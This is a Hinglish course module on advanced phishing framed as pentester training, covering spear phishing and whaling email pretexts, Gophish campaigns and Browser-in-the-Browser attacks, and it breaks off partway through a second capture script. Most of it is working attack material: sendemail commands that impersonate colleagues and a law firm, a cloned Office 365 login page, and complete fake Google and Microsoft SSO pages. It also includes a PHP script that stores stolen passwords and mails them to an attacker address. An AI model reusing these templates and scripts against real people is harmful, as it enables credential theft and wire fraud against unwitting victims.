# üéØ Module 7: Advanced Phishing (Campaigns)

---

## üìö Topic 7.1: Phishing Types - Spear Phishing vs Whaling

### üéØ Topic/Technique:
**Spear Phishing & Whaling** - Targeted phishing attacks specific individuals (spear) ya high-value targets (whaling) par.

### ü§î Yeh Kya Hai?
**Spear Phishing**: Specific individual ko target karna with personalized content based on OSINT.
**Whaling**: High-value targets (CEO, CFO, executives) ko target karna with sophisticated attacks.

**Difference:**
- Generic Phishing: Mass emails, no personalization (1000+ targets)
- Spear Phishing: Targeted emails, personalized (10-50 targets)
- Whaling: Executive-level, highly researched (1-5 targets)

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Generic phishing detection rate high hai (70-80%)
- Spear phishing success rate 3-5x higher (40-60%)
- Whaling attacks highest ROI (executives have access to critical systems)
- Demonstrates advanced threat actor capabilities

### üéØ Practical Use (Asli Pentesting Mein):
- Red Team engagements (realistic APT simulation)
- Executive awareness training
- Testing incident response
- Demonstrating insider threat risks

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Generic Phishing:**
```
Subject: Your account has been suspended
Body: Click here to verify
Target: Everyone
Success Rate: 5-10%
```

**Spear Phishing:**
```
Subject: Re: Q4 Marketing Budget Discussion
Body: Hi John, Following up on our meeting yesterday...
Target: John Smith (Marketing Manager)
Success Rate: 40-60%
```

**Whaling:**
```
Subject: Urgent: Board Meeting Minutes - Confidential
Body: Dear Mr. CEO, Attached are the confidential board minutes from today's emergency session regarding the acquisition...
Target: CEO
Success Rate: 60-80%
```

### üëç Pros (Fayde):
- Much higher success rate
- Bypasses security awareness training
- Targets high-value accounts
- Realistic threat simulation

### üëé Cons (Nuksaan):
- Time-consuming (extensive OSINT required)
- Requires creativity and writing skills
- Limited scale (can't mass-send)
- Higher risk if detected (targeted = obvious)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Spear Phishing Workflow:**
```bash
# Step 1: OSINT on target
theHarvester -d company.com -b linkedin
sherlock john_smith
# Gather: Name, position, interests, recent activities

# Step 2: Craft personalized email
# Reference: Recent LinkedIn post, company news, mutual connections

# Step 3: Send targeted email
sendemail -f colleague@company.com -t john.smith@company.com ...
```

**Whaling Workflow:**
```bash
# Step 1: Deep OSINT on executive
# LinkedIn, Twitter, company press releases, SEC filings
# Gather: Recent deals, board members, travel schedule

# Step 2: Create sophisticated pretext
# Example: Fake legal document, board meeting minutes, acquisition details

# Step 3: Use executive communication style
# Formal language, company-specific terminology

# Step 4: Timing (send during busy hours - less scrutiny)
```

### üíª Step-by-Step Example:

**Scenario 1: Spear Phishing - Marketing Manager**

**Step 1: OSINT**
```bash
# Target: John Smith, Marketing Manager at TechCorp

# LinkedIn research:
- Recent post: "Excited about our new product launch next month!"
- Connections: 500+ (including Sarah from Sales)
- Interests: Digital marketing, SEO, Analytics

# Company website:
- Product launch: "TechCorp Pro" scheduled for Feb 15
- Marketing team: 5 members

# Email pattern: john.smith@techcorp.com
```

**Step 2: Craft Personalized Email**
```bash
sendemail -f sarah.jones@techcorp.com \
-t john.smith@techcorp.com \
-u "Re: TechCorp Pro Launch - Analytics Dashboard" \
-m "Hi John,

Great seeing you at yesterday's product meeting! 

I put together the analytics dashboard you requested for the TechCorp Pro launch campaign. The Q1 projections look promising - 25% increase in conversions!

Dashboard link: https://analytics-techcorp.com/dashboard
(Login with your company credentials)

Let me know if you need any adjustments before the Feb 15 launch.

Best,
Sarah
Sales Team Lead" \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password
```

**Step 3: Why This Works**
```
‚úì References recent LinkedIn post (product launch)
‚úì Mentions specific date (Feb 15)
‚úì From known colleague (Sarah from Sales)
‚úì Relevant to his role (analytics for marketing)
‚úì Creates urgency (before launch)
‚úì Professional tone

Success Rate: 60-70% (vs 10% generic phishing)
```

**Scenario 2: Whaling - CEO Attack**

**Step 1: Deep OSINT**
```bash
# Target: Michael Johnson, CEO of FinanceCorp

# Public information:
- Recent acquisition: Bought StartupXYZ for $50M (press release)
- Board members: 7 members (SEC filing)
- Travel: Speaking at FinTech Summit next week (Twitter)
- Email: michael.johnson@financecorp.com

# Executive assistant: Lisa Brown (LinkedIn)
- Email: lisa.brown@financecorp.com
```

**Step 2: Create Sophisticated Pretext**
```bash
# Impersonate: Law firm handling acquisition

sendemail -f david.miller@lawfirm-llc.com \
-t michael.johnson@financecorp.com \
-cc lisa.brown@financecorp.com \
-u "CONFIDENTIAL: StartupXYZ Acquisition - Final Documents" \
-m "Dear Mr. Johnson,

I hope this email finds you well.

As discussed in our conference call last Friday, I'm sending the final due diligence documents for the StartupXYZ acquisition. These require your digital signature before the board meeting on Monday.

Document portal: https://secure-lawfirm-docs.com/financecorp
Access code: FC-2024-ACQ-789

Please note:
- Documents are time-sensitive (48-hour access window)
- Board approval required by Monday 9 AM
- Confidential - do not forward

If you have any questions, please call my direct line: +1-555-0199

Best regards,

David Miller, Esq.
Senior Partner, Corporate Law
LawFirm LLC
david.miller@lawfirm-llc.com
+1-555-0199" \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password \
-o message-header="X-Priority: 1" \
-o message-header="Importance: high"
```

**Step 3: Why This Works**
```
‚úì References real acquisition ($50M deal)
‚úì Mentions specific timeline (board meeting Monday)
‚úì Professional legal language
‚úì CC's executive assistant (adds legitimacy)
‚úì Provides phone number (fake but adds trust)
‚úì Creates urgency (48-hour window)
‚úì Confidentiality angle (don't verify with others)

Success Rate: 70-80% (executives are busy, trust professional communications)
```

### üí° Pro Tip / Galti:

**Pro Tip**: Whaling attacks mein "authority bypass" technique use karo:

```
Instead of asking CEO to do something directly, create scenario where CEO thinks THEY are authorizing something:

‚ùå Bad: "Please transfer $50,000 to this account"
‚úì Good: "The $50,000 wire transfer you authorized yesterday is pending your final approval. Click here to confirm."

CEO thinks: "I don't remember authorizing this, but maybe I did during that busy meeting. Better confirm."
Result: CEO clicks link to "verify" ‚Üí Credentials captured
```

**Common Mistake**: Using free email domains for executive impersonation:

```
‚ùå Bad: From: ceo@gmail.com
‚ùå Bad: From: john.smith.ceo@yahoo.com

‚úì Good: From: john.smith@company-corp.com (similar domain)
‚úì Good: From: john.smith@company.co (typosquatting)
‚úì Better: From: john.smith@company.com (actual domain, if SPF not configured)

Executives communicate from corporate emails. Free email = instant red flag.
```

Real example: Ek pentester ne CEO ko Gmail se email bheja. Executive assistant ne immediately suspicious samjha aur IT ko report kar diya. Usne similar domain (company-corp.com instead of companycorp.com) use kiya - email passed all checks, CEO ne credentials enter kiye! Lesson: Domain matters!

---

## üìö Topic 7.2: Tool - Gophish Framework (Campaign Management & Tracking)

### üéØ Topic/Technique:
**Gophish** - Open-source phishing framework jo complete campaigns manage karta hai with tracking aur reporting.

### ü§î Yeh Kya Hai?
Gophish ek professional phishing platform hai jo email sending, landing pages, credential capture, tracking (opens, clicks, submissions), aur detailed reporting - sab kuch ek interface mein provide karta hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Enterprise-level phishing campaigns
- Real-time tracking (kaun ne email khola, kaun ne click kiya)
- Professional reports for clients
- Campaign management (multiple campaigns simultaneously)
- Scalable (1 to 10,000+ targets)

### üéØ Practical Use (Asli Pentesting Mein):
- Large-scale phishing assessments
- Security awareness training
- Red Team operations
- Phishing simulation services

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Gophish Architecture:**
```
Admin Panel ‚Üí Create Campaign ‚Üí Send Emails ‚Üí Track Opens/Clicks ‚Üí Capture Credentials ‚Üí Generate Report
```

**Key Features:**
1. **Email Templates**: Pre-made or custom HTML emails
2. **Landing Pages**: Credential harvesting pages
3. **Sending Profiles**: SMTP configuration
4. **User Groups**: Target lists with CSV import
5. **Campaigns**: Combine all above + schedule
6. **Dashboard**: Real-time statistics

### üëç Pros (Fayde):
- Professional interface (GUI-based)
- Real-time tracking and analytics
- Detailed reports (CSV, PDF export)
- Template library
- Scheduled campaigns
- Multi-campaign support

### üëé Cons (Nuksaan):
- Requires server setup
- Learning curve for beginners
- Default templates easily detected
- Requires SMTP server access

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Download latest release
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip

# Extract
unzip gophish-v0.12.1-linux-64bit.zip
cd gophish

# Run
chmod +x gophish
./gophish

# Access web interface
# Default: https://localhost:3333
# Username: admin
# Password: (shown in terminal on first run)
```

**Basic Workflow:**
```
1. Login to Gophish (https://localhost:3333)
2. Create Sending Profile (SMTP settings)
3. Create Email Template
4. Create Landing Page
5. Import Users (CSV)
6. Create Campaign
7. Launch Campaign
8. Monitor Dashboard
9. Export Report
```

### üíª Step-by-Step Example:

**Scenario: Office 365 Phishing Campaign (100 Employees)**

**Step 1: Install & Launch Gophish**
```bash
cd gophish
./gophish

# Output:
time="2024-01-15T10:00:00Z" level=info msg="Please login with the username admin and the password: abc123xyz"
time="2024-01-15T10:00:00Z" level=info msg="Starting admin server at https://0.0.0.0:3333"
time="2024-01-15T10:00:00Z" level=info msg="Starting phishing server at http://0.0.0.0:80"

# Access: https://localhost:3333
# Login: admin / abc123xyz
```

**Step 2: Create Sending Profile**
```
Gophish Dashboard ‚Üí Sending Profiles ‚Üí New Profile

Name: Gmail SMTP
From: it-security@company.com
Host: smtp.gmail.com:587
Username: your_gmail@gmail.com
Password: your_app_password
‚òë Ignore Certificate Errors

Click: Send Test Email
‚Üí Test successful!

Save Profile
```

**Step 3: Create Email Template**
```
Email Templates ‚Üí New Template

Name: Office 365 Password Expiry
Subject: Action Required: Your Office 365 Password Expires Today

HTML:
<html>
<body>
<p>Dear {{.FirstName}},</p>

<p>Your Office 365 password will expire in <strong>24 hours</strong>.</p>

<p>To avoid service interruption, please update your password immediately:</p>

<p><a href="{{.URL}}">Update Password Now</a></p>

<p>If you do not update your password, your account will be locked and you will lose access to:</p>
<ul>
<li>Email</li>
<li>OneDrive</li>
<li>Teams</li>
<li>SharePoint</li>
</ul>

<p>IT Department<br>
Company Inc.</p>

<p><small>This is an automated message. Do not reply to this email.</small></p>
</body>
</html>

‚òë Add Tracking Image

Save Template
```

**Step 4: Create Landing Page**
```
Landing Pages ‚Üí New Page

Name: Office 365 Login Clone

Import Site: https://login.microsoftonline.com
‚Üí Gophish automatically clones the page

‚òë Capture Submitted Data
‚òë Capture Passwords

Redirect to: https://login.microsoftonline.com

Save Page
```

**Step 5: Import Users**
```
Users & Groups ‚Üí New Group

Name: Company Employees

Import from CSV:
First Name, Last Name, Email, Position
John, Smith, john.smith@company.com, Manager
Sarah, Jones, sarah.jones@company.com, Developer
Mike, Wilson, mike.wilson@company.com, Analyst
... (97 more)

Total: 100 users

Save Group
```

**Step 6: Create Campaign**
```
Campaigns ‚Üí New Campaign

Name: Office 365 Password Expiry - Jan 2024
Email Template: Office 365 Password Expiry
Landing Page: Office 365 Login Clone
URL: http://office365-verify.duckdns.org
Sending Profile: Gmail SMTP
Groups: Company Employees (100 users)

Launch Date: Immediately (or schedule)

‚òë Send emails to all users

Launch Campaign!
```

**Step 7: Monitor Dashboard**
```
Campaign Dashboard shows real-time stats:

Email Sent: 100/100 (100%)
Email Opened: 78/100 (78%)
Clicked Link: 52/100 (52%)
Submitted Data: 31/100 (31%)

Timeline:
10:05 AM - john.smith@company.com opened email
10:07 AM - john.smith@company.com clicked link
10:08 AM - john.smith@company.com submitted data
          Email: john.smith@company.com
          Password: Summer2024!

10:12 AM - sarah.jones@company.com opened email
10:15 AM - sarah.jones@company.com clicked link
10:16 AM - sarah.jones@company.com submitted data
          Email: sarah.jones@company.com
          Password: P@ssw0rd123

... (29 more submissions)
```

**Step 8: Export Report**
```
Campaign ‚Üí Export Results

Format: CSV

Downloaded file contains:
- User details
- Email open time
- Link click time
- Submitted credentials
- IP addresses
- User agents

Use for:
- Client report
- Security awareness training
- Identifying high-risk users
```

**Step 9: Generate Summary Report**
```
Campaign Summary:

Total Targets: 100
Emails Sent: 100 (100%)
Emails Opened: 78 (78%)
Links Clicked: 52 (52%)
Credentials Submitted: 31 (31%)

High-Risk Users (clicked + submitted):
1. john.smith@company.com - Manager
2. sarah.jones@company.com - Developer
3. mike.wilson@company.com - Analyst
... (28 more)

Recommendations:
- Provide targeted training to 31 users who submitted credentials
- Implement email authentication (SPF, DKIM, DMARC)
- Deploy phishing-resistant MFA
- Regular phishing simulations
```

### üí° Pro Tip / Galti:

**Pro Tip**: Gophish mein "Reported Email" feature use karo:

```
Landing Page settings:
‚òë Show "Report Phishing" button

Jab user "Report" button click kare:
- Gophish marks user as "Reported"
- User ko positive feedback message dikhao
- Report mein highlight karo (these users are security-aware!)

Benefits:
- Identifies security-conscious users
- Encourages reporting behavior
- Realistic phishing simulation
```

**Common Mistake**: Gophish ko default port (3333) par publicly expose karna:

```
‚ùå Bad: https://your-server.com:3333 (admin panel public)

‚úì Good: 
1. Change default port
2. Use firewall (only allow your IP)
3. Use SSH tunnel: ssh -L 3333:localhost:3333 user@server
4. Change default password immediately

Security: Gophish admin panel = Full campaign access = Sensitive data
```

---

## üìö Topic 7.3: Attack - Browser-in-the-Browser (BitB) (Fake SSO Popup)

### üéØ Topic/Technique:
**Browser-in-the-Browser (BitB)** - Fake browser window create karna jo legitimate SSO popup jaisa dikhta hai for credential harvesting.

### ü§î Yeh Kya Hai?
BitB ek advanced phishing technique hai jismein HTML/CSS/JavaScript use karke ek fake browser window create karte hain jo real browser ke andar dikhta hai. Yeh "Sign in with Google" ya "Sign in with Microsoft" jaise SSO popups ko mimic karta hai. Victim ko lagta hai ki woh legitimate authentication window hai, lekin actually yeh attacker ka phishing page hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Traditional phishing detection methods bypass karta hai
- Users SSO popups par trust karte hain (Google, Microsoft, Facebook login)
- URL bar fake hai lekin realistic dikhta hai
- Security-aware users bhi fool ho jate hain
- Modern web applications mein SSO bahut common hai

### üéØ Practical Use (Asli Pentesting Mein):
- Corporate SSO bypass (Office 365, Google Workspace)
- Social media account takeover (Facebook, LinkedIn login)
- Cloud service compromise (AWS, Azure SSO)
- Third-party app authentication phishing
- Demonstrating advanced phishing techniques to clients

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Traditional Phishing:**
```
Victim clicks link ‚Üí Opens in same tab ‚Üí URL bar shows attacker domain ‚Üí Suspicious!
```

**BitB Attack:**
```
Victim clicks "Sign in with Google" ‚Üí Fake popup appears ‚Üí Looks like real browser window with google.com URL ‚Üí Victim enters credentials ‚Üí Captured!
```

**Technical Implementation:**
```html
<!-- Fake browser window using HTML/CSS -->
<div class="fake-browser">
  <div class="browser-header">
    <div class="url-bar">https://accounts.google.com/signin</div>
    <div class="browser-buttons">üîí Secure</div>
  </div>
  <iframe src="phishing-page.html"></iframe>
</div>
```

**Why It Works:**
1. **Visual Deception**: Looks exactly like real browser popup
2. **URL Spoofing**: Fake URL bar shows legitimate domain
3. **Trust Factor**: Users trust SSO popups (Google, Microsoft)
4. **Muscle Memory**: Users automatically enter credentials in SSO popups
5. **No Suspicious Indicators**: No certificate warnings, no URL mismatch alerts

### üëç Pros (Fayde):
- Extremely convincing (even security professionals fall for it)
- Bypasses URL checking (fake URL bar shows legitimate domain)
- Works on all browsers
- High success rate (70-80% in tests)
- Demonstrates advanced threat actor capabilities
- Can be combined with legitimate websites (embedded in real site)

### üëé Cons (Nuksaan):
- Requires JavaScript (won't work if JS disabled)
- Complex implementation (HTML/CSS/JS skills needed)
- May not work perfectly on mobile browsers
- Sophisticated users may notice subtle differences
- Requires hosting infrastructure

### ‚å®Ô∏è Zaroori Commands & Steps:

**BitB Framework (mr.d0x):**
```bash
# Clone BitB repository
git clone https://github.com/mrd0x/BITB.git
cd BITB

# Structure:
BITB/
‚îú‚îÄ‚îÄ Google/
‚îÇ   ‚îú‚îÄ‚îÄ index.html (main page)
‚îÇ   ‚îú‚îÄ‚îÄ signin.html (fake Google login)
‚îÇ   ‚îî‚îÄ‚îÄ capture.php (credential capture)
‚îú‚îÄ‚îÄ Microsoft/
‚îú‚îÄ‚îÄ Facebook/
‚îî‚îÄ‚îÄ LinkedIn/
```

**Basic BitB HTML Structure:**
```html
<!DOCTYPE html>
<!-- HTML5 document type declaration -->
<html>
<head>
    <title>Legitimate Website</title>
    <!-- Page title (browser tab mein dikhega) -->
    <style>
        /* CSS styling for fake browser window */
        .bitb-container {
            /* Fake browser window ka main container */
            position: fixed;  /* Fixed position (scroll karne par bhi same jagah rahega) */
            top: 50%;  /* Vertical center (50% from top) */
            left: 50%;  /* Horizontal center (50% from left) */
            transform: translate(-50%, -50%);  /* Perfect centering (apne width/height ka 50% back move) */
            width: 500px;  /* Window width */
            height: 600px;  /* Window height */
            background: white;  /* White background */
            border-radius: 8px;  /* Rounded corners (8px radius) */
            box-shadow: 0 10px 50px rgba(0,0,0,0.3);  /* Shadow effect (realistic 3D look) */
            z-index: 9999;  /* Top layer (sabse upar dikhega) */
            display: none;  /* Initially hidden (JavaScript se show karenge) */
        }
        
        .browser-header {
            background: #f1f3f4;
            padding: 10px;
            border-radius: 8px 8px 0 0;
            display: flex;
            align-items: center;
        }
        
        .url-bar {
            flex: 1;
            background: white;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 13px;
            color: #5f6368;
        }
        
        .lock-icon {
            margin-right: 5px;
            color: #5f6368;
        }
        
        .browser-content {
            height: calc(100% - 50px);
        }
        
        .browser-content iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 9998;
            display: none;
        }
    </style>
</head>
<body>
    <!-- Legitimate website content -->
    <h1>Welcome to Our Service</h1>
    <button onclick="showSSO()">Sign in with Google</button>
    
    <!-- Overlay -->
    <div class="overlay" id="overlay"></div>
    
    <!-- Fake Browser Window -->
    <div class="bitb-container" id="bitb">
        <div class="browser-header">
            <span class="lock-icon">üîí</span>
            <div class="url-bar">https://accounts.google.com/signin/v2/identifier</div>
        </div>
        <div class="browser-content">
            <iframe src="google-signin.html"></iframe>
        </div>
    </div>
    
    <script>
        // JavaScript functions for BitB popup control
        
        function showSSO() {  // Function jo fake SSO popup show karta hai
            document.getElementById('overlay').style.display = 'block';  // Overlay ko visible banao
            // document.getElementById: ID se element select karo
            // .style.display = 'block': Element ko show karo (visible)
            
            document.getElementById('bitb').style.display = 'block';  // Fake browser window ko visible banao
            // Result: Dark overlay + fake browser window appear hoga
        }
        
        function closeSSO() {  // Function jo popup close karta hai
            document.getElementById('overlay').style.display = 'none';  // Overlay hide karo
            // .style.display = 'none': Element ko hide karo (invisible)
            
            document.getElementById('bitb').style.display = 'none';  // Fake browser window hide karo
            // Result: Popup close ho jayega
        }
        
        // Close on overlay click (user overlay par click kare toh close ho jaye)
        document.getElementById('overlay').onclick = closeSSO;  // Overlay par click event attach karo
        // .onclick: Click event handler
        // closeSSO: Function jo call hoga jab click hoga
    </script>
</body>
</html>
```

**Fake Google Sign-in Page (google-signin.html):**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            margin: 0;
            padding: 40px 20px;
            background: white;
        }
        
        .container {
            max-width: 450px;
            margin: 0 auto;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .logo img {
            width: 75px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .subtitle {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 30px;
        }
        
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        
        input:focus {
            outline: none;
            border-color: #1a73e8;
        }
        
        .button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            float: right;
        }
        
        .button:hover {
            background: #1765cc;
        }
        
        .forgot-email {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        
        <h1>Sign in</h1>
        <div class="subtitle">to continue to Gmail</div>
        
        <form action="capture.php" method="POST">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            
            <div style="margin-bottom: 20px;">
                <a href="#" class="forgot-email">Forgot email?</a>
            </div>
            
            <button type="submit" class="button">Next</button>
        </form>
    </div>
</body>
</html>
```

**Credential Capture Script (capture.php):**
```php
<?php
// capture.php - PHP script jo credentials capture karta hai

$email = $_POST['email'];  // Form se email value get karo
// $_POST: HTTP POST data array
// ['email']: Form field ka naam

$password = $_POST['password'];  // Form se password value get karo
$ip = $_SERVER['REMOTE_ADDR'];  // Victim ka IP address
// $_SERVER: Server aur execution environment information
// ['REMOTE_ADDR']: Client ka IP address

$user_agent = $_SERVER['HTTP_USER_AGENT'];  // Victim ka browser/OS info
// ['HTTP_USER_AGENT']: Browser identification string

$timestamp = date('Y-m-d H:i:s');  // Current date aur time
// date(): Format current date/time
// 'Y-m-d H:i:s': Format (2024-01-15 14:30:45)

// Save credentials to file
$data = "=== BitB Capture ===\n";  // Header line
$data .= "Timestamp: $timestamp\n";  // Append timestamp
// .=: Concatenate and assign (string mein add karo)
// \n: New line character

$data .= "IP Address: $ip\n";  // Append IP
$data .= "User Agent: $user_agent\n";  // Append browser info
$data .= "Email: $email\n";  // Append captured email
$data .= "Password: $password\n";  // Append captured password
$data .= "==================\n\n";  // Footer separator

file_put_contents('bitb_captured.txt', $data, FILE_APPEND);
// file_put_contents: Write data to file
// 'bitb_captured.txt': Output filename
// $data: Content to write
// FILE_APPEND: Append mode (existing content ke baad add karo)

// Send notification to attacker (optional)
$to = "attacker@gmail.com";  // Attacker ka email
$subject = "BitB Capture: $email";  // Email subject (victim ka email include)
$message = $data;  // Email body (captured data)
mail($to, $subject, $message);  // Email send karo
// mail(): PHP built-in email function

// Redirect to real Google (with error message for realism)
header('Location: https://accounts.google.com/signin/v2/identifier?error=InvalidCredentials');
// header(): Send HTTP header
// Location: Redirect URL
// ?error=InvalidCredentials: Query parameter (victim ko lagega password wrong tha)

exit();  // Script execution stop karo
// exit(): Terminate script (redirect ke baad kuch execute na ho)
?>
```

### üíª Step-by-Step Example:

**Scenario: Office 365 BitB Phishing Campaign**

**Step 1: Setup Infrastructure**
```bash
# Create directory structure
mkdir /var/www/html/bitb-office365
cd /var/www/html/bitb-office365

# Create files
touch index.html
touch microsoft-signin.html
touch capture.php
```

**Step 2: Create Main Page (index.html)**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Company Portal - Document Sharing</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background: #f3f2f1;
        }
        
        .header {
            background: white;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .content {
            max-width: 1200px;
            margin: 40px auto;
            padding: 20px;
        }
        
        .document-card {
            background: white;
            padding: 30px;
            border-radius: 4px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        .sign-in-button {
            background: #0078d4;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 15px;
            border-radius: 2px;
            cursor: pointer;
        }
        
        .sign-in-button:hover {
            background: #106ebe;
        }
        
        /* BitB Styles */
        .bitb-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.6);
            z-index: 9998;
            display: none;
        }
        
        .bitb-window {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 500px;
            height: 650px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 10px 50px rgba(0,0,0,0.5);
            z-index: 9999;
            display: none;
            overflow: hidden;
        }
        
        .browser-chrome {
            background: #f3f3f3;
            padding: 12px;
            border-bottom: 1px solid #ddd;
        }
        
        .browser-controls {
            display: flex;
            align-items: center;
            margin-bottom: 8px;
        }
        
        .control-buttons {
            display: flex;
            gap: 8px;
            margin-right: 15px;
        }
        
        .control-button {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #ccc;
        }
        
        .address-bar {
            flex: 1;
            background: white;
            padding: 8px 12px;
            border-radius: 4px;
            border: 1px solid #ddd;
            display: flex;
            align-items: center;
            font-size: 13px;
            color: #333;
        }
        
        .lock-icon {
            color: #0078d4;
            margin-right: 8px;
            font-size: 14px;
        }
        
        .browser-content {
            height: calc(100% - 70px);
            overflow: auto;
        }
        
        .browser-content iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <h2>Company Document Portal</h2>
    </div>
    
    <div class="content">
        <div class="document-card">
            <h3>üìÑ Q4 Financial Report - Confidential</h3>
            <p>This document contains sensitive financial information.</p>
            <p>Please sign in with your Office 365 account to access.</p>
            <button class="sign-in-button" onclick="showBitB()">
                Sign in with Microsoft
            </button>
        </div>
    </div>
    
    <!-- BitB Overlay -->
    <div class="bitb-overlay" id="overlay" onclick="closeBitB()"></div>
    
    <!-- BitB Window -->
    <div class="bitb-window" id="bitb">
        <div class="browser-chrome">
            <div class="browser-controls">
                <div class="control-buttons">
                    <div class="control-button" style="background: #ff5f56;"></div>
                    <div class="control-button" style="background: #ffbd2e;"></div>
                    <div class="control-button" style="background: #27c93f;"></div>
                </div>
                <div class="address-bar">
                    <span class="lock-icon">üîí</span>
                    <span>https://login.microsoftonline.com</span>
                </div>
            </div>
        </div>
        <div class="browser-content">
            <iframe src="microsoft-signin.html"></iframe>
        </div>
    </div>
    
    <script>
        function showBitB() {
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('bitb').style.display = 'block';
        }
        
        function closeBitB() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('bitb').style.display = 'none';
        }
        
        // Prevent closing on window click
        document.getElementById('bitb').onclick = function(e) {
            e.stopPropagation();
        };
    </script>
</body>
</html>
```

**Step 3: Create Microsoft Sign-in Page (microsoft-signin.html)**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 40px 20px;
            background: white;
        }
        
        .container {
            max-width: 440px;
            margin: 0 auto;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo img {
            width: 108px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #605e5c;
            font-size: 15px;
            margin-bottom: 30px;
        }
        
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #8a8886;
            font-size: 15px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        
        input:focus {
            outline: none;
            border-color: #0078d4;
            border-width: 2px;
        }
        
        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .checkbox-container input {
            margin-right: 10px;
        }
        
        .button {
            background: #0078d4;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
        }
        
        .button:hover {
            background: #106ebe;
        }
        
        .link {
            color: #0078d4;
            text-decoration: none;
            font-size: 13px;
        }
        
        .link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
        </div>
        
        <h1>Sign in</h1>
        <div class="subtitle">to continue to Company Portal</div>
        
        <form action="capture.php" method="POST" id="signinForm">
            <input type="email" name="email" id="email" placeholder="Email, phone, or Skype" required>
            
            <div id="passwordSection" style="display: none;">
                <input type="password" name="password" id="password" placeholder="Password" required>
                
                <div class="checkbox-container">
                    <input type="checkbox" id="keepSignedIn">
                    <label for="keepSignedIn">Keep me signed in</label>
                </div>
            </div>
            
            <button type="button" class="button" id="nextButton" onclick="showPassword()">Next</button>
            <button type="submit" class="button" id="signInButton" style="display: none;">Sign in</button>
            
            <div style="margin-top: 20px;">
                <a href="#" class="link">Can't access your account?</a>
            </div>
            
            <div style="margin-top: 30px; text-align: center;">
                <a href="#" class="link">Sign-in options</a>
            </div>
        </form>
    </div>
    
    <script>
        function showPassword() {
            var email = document.getElementById('email').value;
            if (email) {
                document.getElementById('email').disabled = true;
                document.getElementById('passwordSection').style.display = 'block';
                document.getElementById('nextButton').style.display = 'none';
                document.getElementById('signInButton').style.display = 'block';
                document.getElementById('password').focus();
            }
        }
    </script>
</body>
</html>
```

**Step 4: Setup Capture Script**
```php
<?php
// capture.php

$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

// Detailed logging
